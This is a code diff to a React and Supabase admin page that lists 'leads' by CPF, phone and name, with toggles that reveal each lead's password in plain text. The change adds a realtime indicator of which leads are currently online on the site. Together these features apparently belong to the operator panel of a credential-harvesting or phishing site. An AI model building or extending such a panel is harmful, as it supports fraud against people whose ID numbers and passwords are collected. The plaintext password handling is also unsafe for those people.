@@ -29,9 +29,18 @@ export default function AdminLeadsPage() {
   const [nextCursor, setNextCursor] = useState<string | null>(null);
   const [visiblePwds, setVisiblePwds] = useState<Set<string>>(new Set());
   const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
+  const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());
 
   const togglePwd = (id: string) =>
     setVisiblePwds((prev) => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s; });
+
+  const fetchOnlineLeadIds = async () => {
+    const { data } = await supabase
+      .from("site_sessions")
+      .select("lead_id")
+      .eq("is_online", true);
+    setOnlineLeadIds(new Set((data ?? []).flatMap((s) => s.lead_id ? [s.lead_id] : [])));
+  };
 
   const fetchLeads = async () => {
     setLoading(true);
@@ -61,13 +70,14 @@ export default function AdminLeadsPage() {
     }
   };
 
-  useEffect(() => { fetchLeads(); }, [showArchived]);
+  useEffect(() => { fetchLeads(); fetchOnlineLeadIds(); }, [showArchived]);
 
   // Real-time updates
   useEffect(() => {
     const channel = supabase
       .channel("admin-leads")
       .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, () => fetchLeads())
+      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, () => fetchOnlineLeadIds())
       .subscribe();
     return () => { supabase.removeChannel(channel); };
   }, [showArchived]);
@@ -272,7 +282,17 @@ export default function AdminLeadsPage() {
                         {checked.has(lead.id) ? <CheckSquare className="h-4 w-4 text-primary" /> : <Square className="h-4 w-4" />}
                       </button>
                     </td>
-                    <td className="px-4 py-3 font-mono text-xs text-foreground">{lead.cpf || "—"}</td>
+                    <td className="px-4 py-3 font-mono text-xs text-foreground">
+                      <span className="flex items-center gap-1.5">
+                        {onlineLeadIds.has(lead.id) && (
+                          <span className="relative flex h-1.5 w-1.5 shrink-0">
+                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
+                            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
+                          </span>
+                        )}
+                        {lead.cpf || "—"}
+                      </span>
+                    </td>
                     <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.phone || "—"}</td>
                     <td className="px-4 py-3 text-xs text-foreground">{lead.nome || "—"}</td>
                     <td className="px-4 py-3">
